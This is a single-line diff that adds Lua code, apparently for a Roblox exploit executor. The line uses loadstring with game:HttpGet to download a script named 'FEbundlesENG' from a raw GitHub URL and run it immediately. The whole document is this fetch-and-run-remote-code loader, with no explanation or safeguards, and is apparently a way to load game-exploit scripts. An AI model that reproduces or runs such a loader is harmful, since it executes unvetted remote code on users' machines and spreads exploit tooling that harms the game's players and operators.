@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Bac0nh1ck/Scripts/cede7b619aa85ba2efc1587e13747bc26c58b434/FEbundlesENG'))()
